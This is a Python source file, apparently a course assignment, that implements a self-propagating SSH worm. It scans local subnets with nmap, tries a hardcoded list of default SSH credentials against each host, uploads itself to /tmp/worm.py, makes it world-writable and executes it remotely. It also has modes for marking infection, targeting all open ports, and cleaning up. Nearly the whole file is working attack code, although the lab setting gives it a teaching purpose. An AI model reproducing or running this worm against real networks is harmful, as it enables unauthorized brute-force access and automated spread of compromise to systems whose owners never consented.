##################################################################
# Author: Wayne Lin
# Version: 2.2
# all functions working as intended
# sped up infection and disinfection
# attacks on VPCS are VERY slow (~15 min per host)
# TODO: expand the worm eventually
# TODO: figure out with is wrong with -a eventually
##################################################################

import os
import sys
import socket
import paramiko
import cryptography
import nmap
import netinfo
import netifaces
import socket
import fcntl
import struct
from pathlib import Path


# The list of credentials to attempt
credList = [
('root', 'toor'),
('admin', '#NetSec!#'),
('osboxes', 'osboxes.org'),
('cpsc', 'cpsc'),
('kali', 'kali'),
('root', 'root'),
('admin', 'admin')
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"
infected_path = Path(INFECTED_MARKER_FILE)
worm_path = Path("/tmp/worm.py")

##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem():
	# Check if the system as infected. One
	# approach is to check for a file called
	# infected.txt in directory /tmp (which
	# you created when you marked the system
	# as infected). 
	
	return infected_path.is_file()

#################################################################
# Marks the system as infected
#################################################################
def markInfected():
	
	# Mark the system as infected. One way to do
	# this is to create a file called infected.txt
	# in directory /tmp/
	
	# Extra safeguard so as to not infect ourselves
	#if getMyIP("eth0") == '10.0.0.10':
	        #return
	try:
		open(INFECTED_MARKER_FILE, 'x')
	except FileExistsError:
		pass

###############################################################
# Spread to the other system and remove all traces of the worm
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def selfDisinfect(path=infected_path):
	
	if isInfectedSystem():
    		path.unlink()
    		worm_path.unlink()
    		exit(0)
	print ("Nothing to disinfect!")	
	
###############################################################
# Check if remote file exists
# @param sftp - the instance of the SFTP client connected
# @param path - the name of the file path
# Output: True if the file exists, False otherwise
###############################################################
def exists(sftp, path):
    try:
        sftp.stat(path)
        return True
    except FileNotFoundError:
        return False	
###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient, md=0):
	
	# This function takes as a parameter 
	# an instance of the SSH class which
	# was properly initialized and connected
	# to the victim system. The worm will
	# copy itself to remote system, change
	# its permissions to executable, and
	# execute itself. Please check out the
	# code we used for an in-class exercise.
	# The code which goes into this function
	# is very similar to that code.	
	
	# Open SFTP Client
        sftpClient = sshClient.open_sftp()
        # Disabled in cleaning mode
        # Only copy over the file if it does not already exist
        if md != 2 and not exists(sftpClient, "/tmp/worm.py"):
        	sftpClient.put("/tmp/worm.py", "/tmp/worm.py")
        # Pass on argument to replicate
        mode = ''
        if md == 1:
	        mode = '-m'
        elif md == 2:
	        mode = '-c'
        elif md == 4:
                mode = '-a'
	# If the file exists, make it writeable by anyone. Then replicate the worm in the victim        
        if exists(sftpClient, "/tmp/worm.py"):
                sftpClient.chmod("/tmp/worm.py", 0o777)
                sshin, sshout, ssherr = sshClient.exec_command("python3 /tmp/worm.py %s &" % (mode))
                print("python3 /tmp/worm.py %s &" % (mode))
                propagate_errors = ssherr.readlines()
                if propagate_errors:
                        print(ssherr.readlines())
        # If cleaning mode is active and the system is not infected, skip cleaning and move on to the next system
        elif md == 2:
        	print("Cleaning mode: worm not present on this host machine. Skipping...")
        	return
        
        # Save a log history on the target system which can be viewed later
        # Disinfection has taken place	
        if md == 2:
        	sshin, sshout, ssherr = sshClient.exec_command("for i in {3..0}; do logger cleaning mode activated!..$i; done")
        # Save a log history on the target system which can be viewed later
        # Worm has replicated
        else: 	
        	sshin, sshout, ssherr = sshClient.exec_command("for i in {1..5}; do logger worm payload activated!..$i; done")


############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, password, sshClient):
	
	# Tries to connect to host host using
	# the username stored in variable userName
	# and password stored in variable password
	# and instance of SSH class sshClient.
	# If the server is down or has some other
	# problem, connect() function which you will
	# be using will throw socket.error exception.	     
	# Otherwise, if the credentials are not
	# correct, it will throw 
	# paramiko.SSHException exception. 
	# Otherwise, it opens a connection
	# to the victim system; sshClient now 
	# represents an SSH connection to the 
	# victim. Most of the code here will
	# be almost identical to what we did
	# during class exercise. Please make
	# sure you return the values as specified
	# in the comments above the function
	# declaration (if you choose to use
	# this skeleton).
	
        try:
                sshClient.connect(host , 22, userName, password)
        except socket.error:
                print ("Error: Host is unreachable.")
                return 3
                exit(3)
        except paramiko.SSHException:
                print ("Error: Incorrect credentials. Failed to establish SSH connection.")
                return 1
                exit(1)
        print ("Successful crack!")
        return 0

###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host, mod=0):
	
	# The credential list
	global credList
	temp = credList
	# speed up cleaning by using a reversed dictionary
	if mod == 2:
		temp.reverse()
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	# The results of an attempt
	attemptResults = None
				
	# Go through the credentials
	for username, password in temp:
		
		# "Brute-force" dictionary attack
		# Call the tryCredentials function
		# to try to connect to the
		# remote system using the above 
		# credentials.  If tryCredentials
		# returns 0 then we know we have
		# successfully compromised the
		# victim. In this case we will
		# return a tuple containing an
		# instance of the SSH connection
		# to the remote system. 
		print ("Trying credentials:", username, " : ", password)
		if tryCredentials(host, username, password, ssh) == 0:
                        return ssh, username, password
			
	# Could not find working credentials
	return None	

####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The IP address of the current system
####################################################
def getMyIP(interface):
	
	# Retrieve and return the IP of the
	# current system. Ignores loopback address
	
	# Get all the network interfaces on the system
	networkInterfaces = netifaces.interfaces()

	# The IP address
	ipAddr = None

	# Go through all the interfaces
	for netFace in networkInterfaces:
	
		if netFace == interface:
			

			# The IP address of the interface
			addr = netifaces.ifaddresses(netFace)[2][0]['addr']

			# Get the IP address
			if not addr == "127.0.0.1":

				# Save the IP addrss and break
				ipAddr = addr
				break

	return ipAddr

#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork(mod=0):
	
	# Scan for hosts on the same network
	# (and adjacent netowrk, depending on setting) 
	# and return the list of discovered
	# IP addresses.
	
	# Create an instance of the port scanner class
	portScanner = nmap.PortScanner()

	# Scan the network for systems whose
	# port 22 is open (that is, there is possibly
	# SSH running there).
	
	# -a (for fun)
	if mod == 4:
	        portScanner.scan('10.0.0.0/23', arguments=' --open')
	# -v VPCS attack
	elif mod == 3:
	        return ['10.0.0.4', '10.0.1.3']
	# -m (EC1)
	elif mod and sys.argv[1] in ['-m', '--multi']:
	        portScanner.scan('10.0.0.0/23', arguments='-p 22 --open')
	# -c (EC2)
	elif mod and sys.argv[1] in ['-c', '--clean']:
		portScanner.scan('10.0.0.0/23', arguments='-p 22 --open')
	# default (no parameters)
	else:
		portScanner.scan('10.0.0.0/24', arguments=' --open')
	# Scan the network for hosts
	hostInfo = portScanner.all_hosts()

	# The list of hosts that are up.
	liveHosts = []

	# Go trough all the hosts returned by nmap
	# and remove all who are not up and running
	for host in hostInfo:
		print('Host : %s (%s)' % (host, portScanner[host].hostname()))
		# Is ths host up?
		if portScanner[host].state() == "up":
			liveHosts.append(host)
			
	return liveHosts


# If we are being run without a command line parameters, 
# then we assume we are executing on a victim system and
# will act maliciously. This way, when you initially run the 
# worm on the origin system, you can simply give it some command
# line parameters so the worm knows not to act maliciously
# on attackers system. If you do not like this approach,
# an alternative approach is to hardcode the origin system's
# IP address and have the worm check the IP of the current
# system against the hardcoded IP. 

# If we are running on the victim, check if 
# the victim was already infected. If so, terminate.
# Otherwise, proceed with malice.

prefix = ''
if len(sys.argv) >= 2 and sys.argv[1] in ['-c', '--clean']:
        prefix = 'dis'
print ("Starting %sinfection:" % (prefix))
multimode = False
cleanmode = False
execmode = 0
myIP = None

# see README for worm results and screenshots

if len(sys.argv) >= 2:
	# debug mode: Just checks that the program compiles and terminates
	if sys.argv[1] in ['-d', '--debug']:
		print ("Debug mode. Exiting now...")
		exit(0)
	myIP = getMyIP("eth0")
	if sys.argv[1] in ['-m', '--multi']:
		execmode = 1
		if isInfectedSystem() and getMyIP("eth0") != '10.0.0.10':
                	exit(0)
		if getMyIP("eth0") != '10.0.0.10':
		        markInfected()
		
	elif sys.argv[1] in ['-c', '--clean']:
	        if not isInfectedSystem() and getMyIP("eth0") != '10.0.0.10':
	                exit(0)
	        execmode = 2
	        selfDisinfect()
	        #worm_path.unlink()
	        #print ("Worm successfully removed!")
	        #exit(0)	
	
	# special attack mode only trying to attack VPCS PC1 and PC2
	# separated from other worm attacks due to being SUPER SLOW
	# otherwise credential check takes over 10 minutes
	# to run, use argument -v or --vpcs	
	elif sys.argv[1] in ['-v', '--vpcs']:
		execmode = 3
	# It's supposed to attack ALL hosts with open ports but for some reason misses Kali-Linux-4. Oh well
	elif sys.argv[1] in ['-a', '--all']:
	        execmode = 4
	        if isInfectedSystem() and getMyIP("eth0") != '10.0.0.10':
                	exit(0)
        	if getMyIP("eth0") != '10.0.0.10':
		        markInfected()
		
elif len(sys.argv) < 2:
	
# If we are running on the victim, check if 
# the victim was already infected. If so, terminate.
# Otherwise, proceed with malice.
# Don't infect the host.
	if isInfectedSystem():
                exit(1)
	if getMyIP("eth0") != '10.0.0.10':
	        markInfected()
# Get the IP of the current system
ipself = getMyIP("eth0")
print ("Getting hosts:...")
# Get the hosts on the same network
# subverted in VPCS attacking mode
networkHosts = getHostsOnTheSameNetwork(execmode)

# Remove the IP of the current system
# from the list of discovered systems (we
# do not want to target ourselves!).
if ipself in networkHosts:
	networkHosts.remove(ipself)

print ("Found hosts: ", networkHosts)


outputString = [
["Attacking victim: ", "Trying to spread", "Spreading complete"],
["Attacking victim: ", "Trying to spread to adjacent network", "Full network spreading complete"],
["Disinfecting victim: ", "Trying to clean", "Cleansing complete"],
["Attempting to attack VPCS hosts: ", "Trying to spread", "Trying to spread"],
["Attempting to attack ALL hosts:", "Trying to spread", "Full spread complete"]
]

# Go through the network hosts
for host in networkHosts:
	
	#if not cleanmode:
	# Try to attack this host
	print (outputString[execmode][0], host)
	sshInfo =  attackSystem(host, execmode)
		
	print (sshInfo)
		
		
	# Did the attack succeed?
	if sshInfo:
			
	        print (outputString[execmode][1])
			
	        # Infect that system
	        spreadAndExecute(sshInfo[0], execmode)

	        print (outputString[execmode][2])	
	else:
	        print ("SSH attack failure: unable to authenticate")
	
	
# delete worm file from a victim if it somehow persists after a cleaning cycle
if getMyIP("eth0") != '10.0.0.10' and len(sys.argv) > 1 and sys.argv[1] in ['-c','--clean']:
	remove(argv[0])
	print ("Worm successfully removed!")
	#try:
    		#worm_path.unlink()
	#except OSError as e:
    		#print("Error: %s : %s" % (worm_path, e.strerror))
